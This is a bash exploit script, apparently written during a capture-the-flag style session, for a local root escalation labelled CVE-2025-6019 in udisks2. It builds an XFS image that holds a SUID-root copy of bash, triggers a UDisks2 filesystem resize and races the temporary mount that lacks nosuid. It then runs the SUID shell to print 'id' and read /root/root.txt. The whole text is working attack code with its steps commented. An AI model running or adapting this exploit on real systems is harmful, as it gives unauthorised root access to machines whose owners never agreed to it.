# Now write the full exploit script that:
# 1. Creates XFS image (already done)
# 2. Sets up loop device via udisksctl
# 3. Mounts it
# 4. Copies bash + chmod 4755
# 5. Unmounts
# 6. Runs the CVE-2025-6019 resize race exploit

#!/bin/bash
set -x

# Verify we have allow_active
echo '=== Checking CanReboot ==='
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot 2>&1

# Verify XFS image exists
file /tmp/xfs.img

# Setup loop device
echo '=== Setting up loop device ==='
udisksctl loop-setup --file /tmp/xfs.img --no-user-interaction 2>&1

# Find loop device
LOOP_DEV=\$(udisksctl loop-setup --file /tmp/xfs.img --no-user-interaction 2>&1 | grep -oP '/dev/loop\\d+')
if [ -z \"\$LOOP_DEV\" ]; then
    # Try to find existing one
    LOOP_DEV=\$(losetup -j /tmp/xfs.img 2>/dev/null | head -1 | cut -d: -f1)
fi
echo \"Loop device: \$LOOP_DEV\"

# Mount
echo '=== Mounting ==='
udisksctl mount -b \$LOOP_DEV --no-user-interaction 2>&1

# Find mount point  
MPOINT=\$(mount | grep loop | tail -1 | awk '{print \$3}')
echo \"Mount point: \$MPOINT\"

if [ -n \"\$MPOINT\" ] && [ -d \"\$MPOINT\" ]; then
    # Copy bash and set SUID
    echo '=== Copying bash ==='
    cp /usr/bin/bash \$MPOINT/xpl
    chmod 4755 \$MPOINT/xpl
    ls -la \$MPOINT/xpl
    
    # Unmount
    echo '=== Unmounting ==='
    udisksctl unmount -b \$LOOP_DEV --no-user-interaction 2>&1
    udisksctl loop-delete -b \$LOOP_DEV --no-user-interaction 2>&1
    
    echo '=== Image ready ==='
    
    # Now exploit: setup loop again, then race on resize
    echo '=== Starting exploit ==='
    udisksctl loop-setup --file /tmp/xfs.img --no-user-interaction 2>&1
    LOOP_DEV2=\$(losetup -j /tmp/xfs.img 2>/dev/null | head -1 | cut -d: -f1)
    LOOP_NAME=\$(basename \$LOOP_DEV2)
    echo \"Loop device for exploit: \$LOOP_DEV2 (\$LOOP_NAME)\"
    
    # Start race condition - look for temp mount without nosuid
    (
        while true; do
            for d in /tmp/blockdev.*/; do
                if [ -x \"\${d}xpl\" ]; then
                    echo '=== FOUND SUID BINARY ==='
                    ls -la \"\${d}xpl\"
                    \"\${d}xpl\" -p -c 'id; echo ROOT; cat /root/root.txt 2>/dev/null'
                    exit 0
                fi
            done
            sleep 0.01
        done
    ) &
    RACE_PID=\$!
    
    sleep 0.5
    
    # Trigger resize
    echo '=== Triggering resize ==='
    gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/\$LOOP_NAME --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' 2>&1
    
    sleep 3
    kill \$RACE_PID 2>/dev/null
    
    # Check for any temp mounts
    echo '=== Checking mounts ==='
    mount | grep blockdev
    ls -la /tmp/blockdev.*/ 2>/dev/null
    
    # Try executing if still mounted
    for d in /tmp/blockdev.*/; do
        if [ -x \"\${d}xpl\" ]; then
            echo '=== Executing SUID bash ==='
            \"\${d}xpl\" -p -c 'id; cat /root/root.txt'
        fi
    done
else
    echo 'MOUNT FAILED'
    mount | grep loop
fi
INNEREOF
